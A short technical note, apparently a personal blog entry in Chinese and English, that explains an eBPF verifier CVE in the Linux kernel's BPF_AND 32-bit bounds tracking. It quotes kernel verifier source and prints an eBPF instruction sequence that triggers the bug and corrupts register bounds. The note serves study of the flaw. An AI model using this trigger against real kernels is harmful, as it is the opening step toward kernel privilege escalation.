---
title: verifier CVE
date: 2021-12-17 14:46:27
modify: 2021-12-17 14:46:27
author: edony.zpc
tags: 001-computer-technology ebpf/verifier/CVE
---

# verifier CVE
## 1. CVE Exploitation
```c
// Load 1 into the register
BPF_MOV64_IMM(CONST_REG, 0x1)
// Left shift 32 bits, the value is now 0x100000000
BPF_ALU64_IMM(BPF_LSH, CONST_REG, 32)
// Add 2, the value is now 0x100000002
BPF_ALU64_IMM(BPF_ADD, CONST_REG, 2)

// Load a pointer to the store_map_fd map into R1. 
BPF_LD_MAP_FD(BPF_REG_1, store_map_fd)
BPF_MOV64_REG(BPF_REG_2, BPF_STACK_REG)
// Load 0 into R0
BPF_MOV64_IMM(BPF_REG_0, 0)
// Store value of R0=0 at stack_ptr-4.
BPF_STX_MEM(BPF_W, BPF_STACK_REG, BPF_REG_0, -4)
// Set R2= stack_ptr-4
BPF_MOV64_REG(BPF_REG_2, BPF_STACK_REG)
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4)
// Call helper function map_lookup_elem. First parameter is in R1 // (map pointer). Second parameter is in R2, (ptr to elem index   // value).  *(word*)(stack_ptr-4) = 0
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem)  

// Read 8 bytes from returned map element pointer and store it in // EXPLOIT_REG.
BPF_LDX_MEM(BPF_DW,EXPLOIT_REG, BPF_REG_R0, 0)

// Set R2 to be 0xFFFFFFFF
BPF_MOV64_IMM(BPF_REG_2, 0xFFFFFFFF)
// Left shift R2 32 bits, so the value is now 0xFFFFFFFF00000000
BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32)
// AND EXPLOIT_REG and R2 and store the results in EXPLOIT_REG
// The upper 32 bits will remain unknown, but the 32 bits are known // to be zero
BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, BPF_REG_2)
// Add 1 to EXPLOIT_REG, it now has mask = 0xFFFFFFFF00000000 and // value = 0x1
BPF_ALU64_IMM(BPF_ADD, EXPLOIT_REG, 1)

// Trigger the bug, EXPLOIT_REG now has u32_min_value=1,           // u32_max_value=0
BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, CONST_REG)
```

c 代码让 Kernel 陷入死循环：
```c
/* The verifier does more data flow analysis than llvm and will not
 * explore branches that are dead at run time. Malicious programs  
 * can have dead code too. Therefore replace all dead at-run-time  
 * code with 'ja -1'.
 *
 * Just nops are not optimal, e.g. if they would sit at the end of 
 * the program and through another bug we would manage to jump     
 * there, then we'd execute beyond program memory otherwise.   
 * Returning exception code also wouldn't work since we can have   
 * subprogs where the dead code could be located.
 */
static void sanitize_dead_code(struct bpf_verifier_env *env)
{
    struct bpf_insn_aux_data *aux_data = env->insn_aux_data;
    struct bpf_insn trap = BPF_JMP_IMM(BPF_JA, 0, 0, -1);
    struct bpf_insn *insn = env->prog->insnsi;
    const int insn_cnt = env->prog->len;
    int i;
    
    for (i = 0; i < insn_cnt; i++) {
            if (aux_data[i].seen)
                   continue;
            memcpy(insn + i, &trap, sizeof(trap));
    }
}
```

## 2. CVE 原理
根据 ebpf [[verifier detailed logic#4 verifier ALU 限制|verifier ALU]] 的执行逻辑，BPF_AND 操作针对 64 bit 和 32 bit 操作出现了问题：
```c
*
/* WARNING: This function does calculations on 64-bit values, but  * the actual execution may occur on 32-bit values. Therefore,      * things like bitshifts need extra checks in the 32-bit case.
*/
static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                                      struct bpf_insn *insn,
                                      struct bpf_reg_state 
                                                  *dst_reg,
                                      struct bpf_reg_state src_reg)
{
...
        case BPF_AND:
                dst_reg->var_off = tnum_and(dst_reg->var_off,       
                src_reg.var_off);
                scalar32_min_max_and(dst_reg, &src_reg);
                scalar_min_max_and(dst_reg, &src_reg);
                break;
        case BPF_OR:
                dst_reg->var_off = tnum_or(dst_reg->var_off,  
                src_reg.var_off);
                scalar32_min_max_or(dst_reg, &src_reg);
                scalar_min_max_or(dst_reg, &src_reg);
                break;
        case BPF_XOR:
                dst_reg->var_off = tnum_xor(dst_reg->var_off,   
                src_reg.var_off);
                scalar32_min_max_xor(dst_reg, &src_reg);
                scalar_min_max_xor(dst_reg, &src_reg);
                break;
                
...
}  

static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
                                 struct bpf_reg_state *src_reg)
{
    bool src_known = tnum_subreg_is_const(src_reg->var_off);
    bool dst_known = tnum_subreg_is_const(dst_reg->var_off);
    struct tnum var32_off = tnum_subreg(dst_reg->var_off);
    s32 smin_val = src_reg->s32_min_value;
    u32 umax_val = src_reg->u32_max_value;


    /* Assuming scalar64_min_max_and will be called so its safe
    * to skip updating register for known 32-bit case.
    */
    if (src_known && dst_known)
        return;
...
}

static void scalar_min_max_and(struct bpf_reg_state *dst_reg,
                              struct bpf_reg_state *src_reg)
{
    bool src_known = tnum_is_const(src_reg->var_off);
    bool dst_known = tnum_is_const(dst_reg->var_off);
    s64 smin_val = src_reg->smin_value;
    u64 umin_val = src_reg->umin_value;

    if (src_known && dst_known) {
            __mark_reg_known(dst_reg, dst_reg->var_off.value);
            return;
    }
  ...
}
```

## References
1. [Kernel Pwning with eBPF: a Love Story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)